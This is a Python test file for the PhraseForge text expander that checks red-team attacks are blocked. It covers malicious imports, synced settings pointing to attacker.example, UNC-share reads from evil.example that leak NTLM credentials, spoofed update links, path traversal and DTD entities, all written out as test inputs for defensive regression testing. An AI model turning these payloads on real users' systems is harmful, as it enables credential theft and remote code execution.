"""Red-team findings (0.6.1): each test is an attack that worked on 0.6.0 and must now fail."""
import os
import sqlite3
import types

os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")

import pytest

from phraseforge import app as appmod
from phraseforge import security
from phraseforge.db import Store, is_device_setting
from phraseforge.host import ExpansionRequest
from phraseforge.io_formats import import_dict


class _App:
    """The parts of the app approved_for() touches."""

    def __init__(self, store, answer=None):
        self.store = store
        self.skipped = []
        self.asked = []
        self.poster = types.SimpleNamespace(posted=types.SimpleNamespace(emit=lambda fn: None))
        self.tray = types.SimpleNamespace(notify=lambda *a: None)
        self.host = types.SimpleNamespace(_ui=lambda fn: (self.asked.append(1), answer or "")[1])


def _req(pid, automatic):
    r = ExpansionRequest(phrase_id=pid)
    r.automatic = automatic
    return r


PAYLOAD = {"format": "phraseforge",
           "folders": [{"id": 1, "name": "Shared", "output_target": "program",
                        "output_target_arg": r"\\attacker\share\tool.exe"}],
           "phrases": [{"description": "Greeting", "content": "Hello!", "folder_id": 1,
                        "triggers": [{"kind": "time", "value": "every:1"}]},
                       {"description": "Mail", "content": "Hi", "folder_id": None, "output_target": "email"}]}


def test_imported_program_output_target_is_not_run_automatically():
    s = Store(":memory:")
    import_dict(s, PAYLOAD)
    p = next(p for p in s.phrases() if p.description == "Greeting")
    app = _App(s)
    assert appmod.approved_for(app, p, _req(p.id, automatic=True)) is False
    assert app.asked == []                     # automatic: skipped without asking


def test_imported_program_output_target_asks_when_typed():
    s = Store(":memory:")
    import_dict(s, PAYLOAD)
    p = next(p for p in s.phrases() if p.description == "Greeting")
    app = _App(s)
    assert appmod.approved_for(app, p, _req(p.id, automatic=False)) is False
    assert app.asked == [1]


def test_imported_email_target_is_not_sent_automatically():
    s = Store(":memory:")
    import_dict(s, PAYLOAD)
    p = next(p for p in s.phrases() if p.description == "Mail")
    assert appmod.approved_for(_App(s), p, _req(p.id, automatic=True)) is False


@pytest.mark.parametrize("chord", ["win+r", "lwin+r", "Windows+r", "windows+x", "meta+r", "super+r", "cmd+r",
                                   "rwin", "lwinkey+r", "vk5b+r", "ctrl+esc", "ctrl+escape", "control+esc"])
def test_every_name_of_the_windows_key_is_privileged(chord):
    assert security.privileged_reason("key", [chord], {})
    assert security.scan_privileged("{#key " + chord + "}")


@pytest.mark.parametrize("chord", ["enter", "ctrl+c", "ctrl+shift+left", "alt+tab", "esc", "shift+esc", "f5"])
def test_ordinary_keys_stay_allowed(chord):
    assert security.privileged_reason("key", [chord], {}) is None


def _snapshot(tmp_path, settings, folders=()):
    src = Store(str(tmp_path / "remote.db"))
    for k, v in settings.items():
        src.set_setting(k, v)
    src.close()
    return tmp_path / "remote.db"


@pytest.mark.parametrize("key,value", [
    ("ai.openai_base_url", "https://collector.example/v1"), ("net.proxy_server", "attacker.example"),
    ("net.allow_private_hosts", "1"), ("backup.directory", r"\\attacker\loot"),
    ("ocr.log_file", r"\\attacker\loot\ocr.txt"), ("onenote.exe", r"C:\Users\Public\x.exe"),
    ("filesearch.commands", r"n = x | \\attacker\share\p.cmd | {query}"),
    ("filesearch.actions", r"Edit = \\attacker\p.exe | {path}"), ("sync.folder_path", r"\\attacker\sync"),
])
def test_a_pulled_or_opened_file_cannot_set_device_settings(tmp_path, key, value):
    """The setting is unset on this PC and set in the incoming file: it must not arrive."""
    assert is_device_setting(key)
    local = Store(":memory:")
    local.restore_from(_snapshot(tmp_path, {key: value, "ui.theme": "dark"}), untrusted="synced")
    assert local.setting(key, "") != value
    assert local.setting("ui.theme") == "dark"          # ordinary settings still sync


def test_device_settings_already_set_here_are_kept(tmp_path):
    local = Store(":memory:")
    local.set_setting("filesearch.commands", "mine")
    local.restore_from(_snapshot(tmp_path, {"filesearch.commands": "theirs"}), untrusted="imported")
    assert local.setting("filesearch.commands") == "mine"


def test_sync_changing_a_folder_output_target_requarantines_its_phrases(tmp_path):
    local = Store(str(tmp_path / "local.db"))
    from phraseforge.models import Folder, Phrase
    f = local.add_folder(Folder("Mine"))
    p = local.add_phrase(Phrase("Own", "plain text", folder_id=f.id))
    assert not local.quarantine_origin(p.id)
    local.backup_to(str(tmp_path / "remote.db"))
    con = sqlite3.connect(str(tmp_path / "remote.db"))
    with con:
        con.execute("UPDATE folders SET output_target='program', output_target_arg='C:\\\\x.bat' WHERE id=?", (f.id,))
    con.close()
    local.restore_from(tmp_path / "remote.db", untrusted="synced")
    assert local.quarantine_origin(p.id) == "synced"


def test_legacy_output_target_setting_cannot_slip_past_the_check(tmp_path):
    import json
    local = Store(str(tmp_path / "local.db"))
    from phraseforge.models import Phrase
    p = local.add_phrase(Phrase("Own", "plain text"))
    local.backup_to(str(tmp_path / "remote.db"))
    con = sqlite3.connect(str(tmp_path / "remote.db"))
    with con:
        con.execute("INSERT OR REPLACE INTO settings VALUES ('ui.trigger_extras', ?)",
                    (json.dumps({f"p:{p.id}": {"output_target": "program", "output_program": "C:\\x.bat"}}),))
    con.close()
    local.restore_from(tmp_path / "remote.db", untrusted="synced")
    from phraseforge import output_target
    target = output_target.resolve(local, local.get_phrase(p.id))[0]
    assert target != "program" or local.quarantine_origin(p.id)


def test_settings_export_leaves_out_secrets(tmp_path):
    from phraseforge.db import SECRET_SETTINGS
    import json
    os.environ["QT_QPA_PLATFORM"] = "offscreen"
    from PySide6.QtWidgets import QApplication
    QApplication.instance() or QApplication([])
    from phraseforge.ui.settings_dialog import SettingsDialog
    s = Store(":memory:")
    s.set_setting("ai.openai_key", "sk-DUMMY")
    d = SettingsDialog(s)
    out = tmp_path / "s.json"
    d.export_to(str(out))
    data = json.loads(out.read_text(encoding="utf-8"))["settings"]
    assert not (set(data) & SECRET_SETTINGS)
    other = Store(":memory:")
    bad = tmp_path / "bad.json"
    bad.write_text(json.dumps({"format": "phraseforge-settings",
                               "settings": {"onenote.exe": "C:\\x.exe", "ui.theme": "dark"}}), encoding="utf-8")
    d2 = SettingsDialog(other)
    d2.import_from(str(bad))
    assert other.setting("onenote.exe", "") != "C:\\x.exe" and other.setting("ui.theme") == "dark"
    assert d2.import_skipped == ["onenote.exe"]


def test_clipboard_history_skips_content_marked_private():
    from phraseforge.clipboard_history import ClipboardHistory
    s = Store(":memory:")
    h = ClipboardHistory(s, foreground_app=lambda: ("keepassxc.exe", ""), marked_private=lambda: True)
    h.on_clipboard_text("Pa55w0rd")
    assert s.clipboard_entries(10) == []
    h2 = ClipboardHistory(s, foreground_app=lambda: ("notepad.exe", ""), marked_private=lambda: False)
    h2.on_clipboard_text("hello")
    assert [e.text for e in s.clipboard_entries(10)] == ["hello"]


def test_http_libraries_do_not_log_urls():
    import logging
    appmod.quiet_http_loggers()
    for name in ("httpx", "httpcore", "urllib3"):
        assert logging.getLogger(name).getEffectiveLevel() >= logging.WARNING


def test_cgnat_range_is_blocked():
    from phraseforge import net
    assert net.is_private_ip("100.100.100.200") and net.is_private_ip("100.64.0.1")
    assert not net.is_private_ip("100.128.0.1")


def test_custom_headers_are_dropped_on_a_redirect_to_another_host(monkeypatch):
    import httpx
    from phraseforge import net
    net.configure({})
    seen = {}

    def handler(request):
        seen[request.url.host] = request.headers.get("x-api-key")
        if request.url.host == "8.8.8.8":
            return httpx.Response(302, headers={"Location": "http://8.8.4.4/collect"})
        return httpx.Response(200, text="ok")

    real = httpx.Client
    monkeypatch.setattr(net.httpx, "Client", lambda **kw: real(**{**kw, "transport": httpx.MockTransport(handler)}))
    assert net.http_request("GET", "http://8.8.8.8/", headers={"x-api-key": "KEY"}) == "ok"
    assert seen == {"8.8.8.8": "KEY", "8.8.4.4": None}


def test_deeply_nested_xml_is_refused_cleanly(tmp_path):
    from phraseforge.importers import phraseexpress as pe
    f = tmp_path / "deep.xml"
    f.write_text("<folder>" * 5000 + "</folder>" * 5000, encoding="utf-8")
    with pytest.raises(ValueError, match="nested"):
        pe.import_xml(Store(":memory:"), f)


# ---------------------------------------------------------------- 0.6.3
def test_sync_changing_a_variable_requarantines_the_phrases_that_read_it(tmp_path):
    """An "Always allow" phrase builds {#run} from a global variable; a synced copy that only
    changes the variable must send the phrase back for approval."""
    from phraseforge.models import Phrase
    local = Store(str(tmp_path / "local.db"))
    tool = local.add_phrase(Phrase("Tool", "{#run {#var tool}}"))
    plain = local.add_phrase(Phrase("Plain", "hello"))
    local.set_var("tool", "notepad.exe")
    local.backup_to(str(tmp_path / "remote.db"))
    con = sqlite3.connect(str(tmp_path / "remote.db"))
    with con:
        con.execute("UPDATE vars SET value=? WHERE scope='global' AND name='tool'", (r"\\attacker\x.exe",))
    con.close()
    local.restore_from(tmp_path / "remote.db", untrusted="synced")
    assert local.quarantine_origin(tool.id) == "synced"
    assert not local.quarantine_origin(plain.id)


def test_dynamic_variable_name_counts_every_variable(tmp_path):
    from phraseforge.models import Phrase
    local = Store(str(tmp_path / "local.db"))
    p = local.add_phrase(Phrase("Dyn", "{#run {#var {#var which}}}"))
    local.set_var("a", "1")
    local.backup_to(str(tmp_path / "remote.db"))
    con = sqlite3.connect(str(tmp_path / "remote.db"))
    with con:
        con.execute("UPDATE vars SET value='2' WHERE name='a'")
    con.close()
    local.restore_from(tmp_path / "remote.db", untrusted="synced")
    assert local.quarantine_origin(p.id) == "synced"


def test_import_that_changes_a_variable_requarantines_its_readers():
    from phraseforge.models import Phrase
    s = Store(":memory:")
    p = s.add_phrase(Phrase("Tool", "{#run {#var tool -default notepad.exe}}"))
    assert not s.quarantine_origin(p.id)
    import_dict(s, {"format": "phraseforge", "vars": [{"name": "tool", "value": r"C:\x.bat", "scope": "global"}]})
    assert s.quarantine_origin(p.id) == "imported"


def test_local_variable_changes_do_not_quarantine():
    """Only data from elsewhere counts: the user's own {#set -scope global} changes nothing."""
    from phraseforge.models import Phrase
    s = Store(":memory:")
    p = s.add_phrase(Phrase("Counter", "{#run {#var tool}}"))
    s.set_var("tool", "calc.exe")
    assert not s.quarantine_origin(p.id)


@pytest.mark.parametrize("url,ok", [
    ("https://github.com/bahattab/B-PhraseForgeExpress/releases/tag/v0.6.3", True),
    ("https://github.com/bahattab/B-PhraseForgeExpress/releases/download/v0.6.3/B-PhraseForgeExpress-Setup-0.6.3.exe", True),
    ("http://github.com/bahattab/B-PhraseForgeExpress/releases/tag/v1", False),
    ("https://evil.example/bahattab/B-PhraseForgeExpress/releases/x.exe", False),
    ("https://github.com.evil.example/bahattab/B-PhraseForgeExpress/releases/x", False),
    ("https://github.com/attacker/B-PhraseForgeExpress/releases/download/v1/x.exe", False),
    ("https://user@github.com/bahattab/B-PhraseForgeExpress/releases/x", False),
    ("https://github.com:8443/bahattab/B-PhraseForgeExpress/releases/x", False),
    ("file:///C:/Windows/System32/calc.exe", False),
    (r"\\attacker\share\x.exe", False), ("", False), (None, False),
])
def test_update_links_must_point_to_this_projects_releases(url, ok):
    from phraseforge import updates
    assert bool(updates.safe_release_url(url)) is ok


def test_latest_release_drops_foreign_links():
    import io
    import json
    from phraseforge import updates

    class R(io.BytesIO):
        def __enter__(self):
            return self

        def __exit__(self, *a):
            return False

    body = {"tag_name": "v9.9.9", "html_url": "https://evil.example/r",
            "assets": [{"name": "B-PhraseForgeExpress-Setup-9.9.9.exe",
                        "browser_download_url": "https://evil.example/Setup.exe"}]}
    rel = updates.latest_release(opener=lambda req, timeout=0: R(json.dumps(body).encode()))
    assert rel["url"] == updates.RELEASES_PAGE and rel["setup_url"] == ""


# ---------------------------------------------------------------- 0.6.4: review of PR #7
def test_choice_menu_brings_back_the_delimiter_and_erases_only_on_choice():
    """Several phrases share "sig": the space typed after it must come back, and the abbreviation
    is erased by the chosen phrase's own expansion (after unlock/approval), not when the menu opens."""
    import queue
    from phraseforge.app import PhraseForgeApp
    fake = types.SimpleNamespace(_jobs=queue.Queue(), _popup_app="notepad.exe", _popup_hwnd=42,
                                 popup=types.SimpleNamespace(language=""))
    shown = []
    fake.poster = types.SimpleNamespace(posted=types.SimpleNamespace(emit=lambda fn: fn()))
    fake._show_popup = lambda hwnd, folder=None, search=False, pending=(0, ""): (
        shown.append(folder), setattr(fake, "_popup_pending", pending))
    PhraseForgeApp._choice_cmd(fake, "5,6:3:32", 42)
    assert shown == ["choice:5,6"] and fake._jobs.empty()
    PhraseForgeApp._popup_phrase_chosen(fake, 6)
    kind, req, hwnd = fake._jobs.get_nowait()
    assert (kind, req.phrase_id, req.erase_chars, req.trailing_delimiter, hwnd) == ("expand", 6, 3, " ", 42)
    PhraseForgeApp._popup_phrase_chosen(fake, 5)                 # the next pick from a normal menu
    _, req2, _ = fake._jobs.get_nowait()
    assert (req2.erase_chars, req2.trailing_delimiter) == (0, "")


def test_choice_menu_hides_the_names_of_locked_phrases(tmp_path):
    os.environ["QT_QPA_PLATFORM"] = "offscreen"
    from PySide6.QtWidgets import QApplication
    QApplication.instance() or QApplication([])
    from phraseforge.db import hash_password
    from phraseforge.models import Folder, Phrase
    from phraseforge.security import LOCKS
    from phraseforge.ui.popup import PhrasePopup
    s = Store(":memory:")
    f = s.add_folder(Folder("Secret"))
    f.password_hash = hash_password("pw")
    s.update_folder(f)
    a = s.add_phrase(Phrase("Public", "a"))
    b = s.add_phrase(Phrase("Bank PIN", "1234", folder_id=f.id))
    pop = PhrasePopup(s)
    pop.show_at(10, 10, caret=None, folder=f"choice:{a.id},{b.id}")
    rows = [(pop.list.item(i).text(), pop.list.item(i).data(0x0100)) for i in range(pop.list.count())]
    texts = " ".join(t for t, _ in rows)
    assert "Public" in texts and "Bank PIN" not in texts and "Locked phrase" in texts
    pop.hide_all(force=True)


# ---------------------------------------------------------------- 0.6.5: review of #24 and #26
@pytest.mark.parametrize("content", [
    r'{#textfile "\\evil.example\s\a.txt"}', r'{#document "//evil.example/s/a.rtf"}',
    r'{#csv \\evil.example\s\a.csv -fromrow 1}', r'{#image "\\?\UNC\evil.example\s\a.png"}',
    r'{#embed "\\evil.example\s\a.txt"}', r'{#xls "\\evil.example\s\a.xlsx" -cell A1}',
    r'{#sql "//evil.example/s/db.sqlite" "SELECT 1"}', r'{#pastefile "\\evil.example\s\a.pdf"}'])
def test_reading_a_network_share_needs_an_approved_phrase(content):
    """R14: on Windows, opening \\\\host\\share sends the user's NTLM credentials to that host."""
    assert security.scan_privileged(content) == [security.NETWORK_READ]
    s = Store(":memory:")
    import_dict(s, {"format": "phraseforge", "phrases": [{"description": "Leak", "content": content}]})
    p = s.phrases()[0]
    app = _App(s)
    assert appmod.approved_for(app, p, _req(p.id, automatic=False)) is False and app.asked == [1]


def test_local_files_need_no_approval(tmp_path):
    f = tmp_path / "note.txt"
    f.write_text("local text", encoding="utf-8")
    for content in (f'{{#textfile "{f}"}}', r'{#document "C:\letters\a.docx"}', '{#image /home/me/a.png}'):
        assert security.scan_privileged(content) == []
    from phraseforge.host import ExpansionContext
    from phraseforge.macros.engine import MacroEngine
    from tests.test_macros import FakeHost
    out = MacroEngine(FakeHost()).expand_to_text(f'{{#textfile "{f}"}}', ExpansionContext(allow_privileged=False))
    assert out == "local text"


def test_a_network_path_built_at_run_time_is_blocked_too():
    """The static scan cannot see a path made by another macro; the engine checks it."""
    from phraseforge.host import ExpansionContext
    from phraseforge.macros.engine import MacroEngine
    from tests.test_macros import FakeHost
    content = "{#textfile {#lower //EVIL.EXAMPLE/S/A.TXT}}"
    assert security.scan_privileged(content) == []
    out = MacroEngine(FakeHost()).expand_to_text(content, ExpansionContext(allow_privileged=False))
    assert "blocked" in out


def test_docx_dtd_is_refused_in_any_encoding(tmp_path):
    """R17: the byte search for <!DOCTYPE missed a UTF-16 document.xml."""
    import zipfile
    from phraseforge.importers import files
    xml = ('<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE d [<!ENTITY a "AAAA">]>'
           '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
           '<w:body><w:p><w:r><w:t>&a;</w:t></w:r></w:p></w:body></w:document>')
    for enc in ("utf-16", "utf-8"):
        p = tmp_path / f"{enc}.docx"
        with zipfile.ZipFile(p, "w") as z:
            z.writestr("word/document.xml", xml.replace("UTF-16", enc.upper()).encode(enc))
        with pytest.raises(ValueError, match="DTD"):
            files.docx_paragraphs(p)


@pytest.mark.parametrize("rtf,text", [
    (r"{\rtf1\mac\ansicpg10000 caf\'8e\par}", "café"),          # old Mac RTF
    (r"{\rtf1\ansi\ansicpg0 a\'e9\par}", "aé"),                  # no such code page: RTF default
    (r"{\rtf1\ansi\ansicpg99999 a\'e9\par}", "aé"),
    (r"{\rtf1\mac caf\'8e}", "café"),
    (r"{\rtf1\ansi\uc1 hi \u-10179?\u-8576?}", "hi \U0001F680"),   # emoji as a surrogate pair (Word)
])
def test_rtf_with_any_code_page_still_reads(rtf, text):
    """R16: an unknown \\ansicpg raised LookupError and broke the import and {#document}."""
    from phraseforge.importers import files
    assert files.rtf_to_text(rtf) == text


def test_spelling_suggestions_never_block_the_menu():
    """R15: a long Arabic word kept the UI frozen for up to 30 s while Hunspell searched."""
    import threading
    import time
    from phraseforge import spell
    release = threading.Event()

    class Slow:
        def lookup(self, w):
            return False

        def suggest(self, w):
            release.wait(5)
            yield "صحيح"

    c = spell.SpellChecker(lambda k, d="": d, loader=lambda code: Slow())
    c.dictionary("ar", wait=True)
    start = time.monotonic()
    assert c.suggest_within("خطأطويل", timeout=0.2) is None          # still searching
    assert time.monotonic() - start < 1
    assert c.suggest_within("خطأطويل", timeout=0.2) is None          # same search, not a second one
    for i in range(c.MAX_SEARCHES - 1):
        assert c.suggest_within(f"كلمة{i}", timeout=0.05) is None
    assert c.suggest_within("زائدة", timeout=0.05) is None            # limit reached: not started
    assert len(c._searching) == c.MAX_SEARCHES
    release.set()
    for _ in range(50):
        if c.suggest_within("خطأطويل", timeout=0.1) == ["صحيح"]:
            break
        time.sleep(0.02)
    assert c.suggest_within("خطأطويل") == ["صحيح"]                     # kept for the next click


def test_spell_settings_from_sync_cannot_name_a_path(tmp_path, monkeypatch):
    """R18: spell.latin came from synced settings and was used as a file name."""
    from phraseforge import spell
    monkeypatch.setenv("PHRASEFORGE_HOME", str(tmp_path / "data"))
    (tmp_path / "x.aff").write_text("SET UTF-8\n", encoding="utf-8")
    (tmp_path / "x.dic").write_text("1\nhello\n", encoding="utf-8")
    loaded = []
    settings = {"spell.latin": "../../x", "spell.arabic": "../x"}
    c = spell.SpellChecker(lambda k, d="": settings.get(k, d), loader=lambda code: loaded.append(code))
    assert c.code_for("latin") == "" and c.code_for("arabic") == ""
    assert not spell.installed("../../x")
    assert not c.is_misspelled("helo") and loaded == []


# ---------------------------------------------------------------- 0.6.6: shared database (#32)
@pytest.fixture
def shared(tmp_path):
    from phraseforge import policy
    from tests.test_shared import Client, sqlite_backend
    policy.set_current(policy.NO_POLICY)
    backend = sqlite_backend(tmp_path)
    clients = []

    def client(user):
        c = Client(backend, user)
        clients.append(c)
        return c
    yield client
    for c in clients:
        c.close()
    policy.set_current(None)


def _share(c, description, content):
    from phraseforge.models import Phrase
    p = c.store.add_phrase(Phrase(description, content, folder_id=c.root))
    c.sync()
    return p


def test_a_shared_phrase_signed_with_my_name_is_still_quarantined(shared):
    """R19: quarantine depended on modified_by, which the writing client fills in itself."""
    alice = shared("alice")
    forger = shared("alice")            # bob writing to the tables under alice's name
    _share(forger, "Report", '{#run "calc.exe"}')
    alice.sync()
    got = alice.phrases()["Report"]
    assert alice.store.quarantine_origin(got.id) == "synced"


def test_a_team_sharing_one_database_login_still_quarantines(shared):
    a, b = shared("team"), shared("team")
    _share(a, "Deploy", '{#run "deploy.cmd"}')
    b.sync()
    assert b.store.quarantine_origin(b.phrases()["Deploy"].id) == "synced"


def test_shared_approval_holds_until_the_content_changes(shared):
    a, b = shared("alice"), shared("bob")
    mine = _share(a, "Tool", '{#run "tool.exe"}')
    assert a.store.quarantine_origin(mine.id) is None          # my own phrase, pushed from here
    b.sync()
    got = b.phrases()["Tool"]
    b.store.release_quarantine(got.id)                          # bob approves it ("Always allow")
    mine = a.store.get_phrase(mine.id)
    mine.description = "Tool (renamed)"
    a.store.update_phrase(mine)
    a.sync()
    b.sync()
    got = b.store.get_phrase(got.id)
    assert got.description == "Tool (renamed)" and b.store.quarantine_origin(got.id) is None
    mine = a.store.get_phrase(mine.id)
    mine.content = '{#run "evil.exe"}'
    a.store.update_phrase(mine)
    a.sync()
    b.sync()
    assert b.store.get_phrase(got.id).content == '{#run "evil.exe"}'
    assert b.store.quarantine_origin(got.id) == "synced"         # new content: ask again
    assert a.store.quarantine_origin(mine.id) is None             # a's own echo stays approved


def test_a_conflict_copy_keeps_the_trust_of_the_edit_it_saves(shared):
    a, b = shared("alice"), shared("bob")
    _share(a, "Note", "v1")
    b.sync()
    got = b.phrases()["Note"]
    b.store.release_quarantine(got.id)
    got.content = "b's edit"
    b.store.update_phrase(got)
    p = a.phrases()["Note"]
    p.content = "a's edit"
    a.store.update_phrase(p)
    a.sync()
    b.sync()
    from phraseforge.shared.mirror import CONFLICT_SUFFIX
    copy = b.phrases()["Note" + CONFLICT_SUFFIX]
    assert copy.content == "b's edit" and b.store.quarantine_origin(copy.id) is None
    assert b.store.quarantine_origin(got.id) == "synced"         # a's text arrived: not approved here
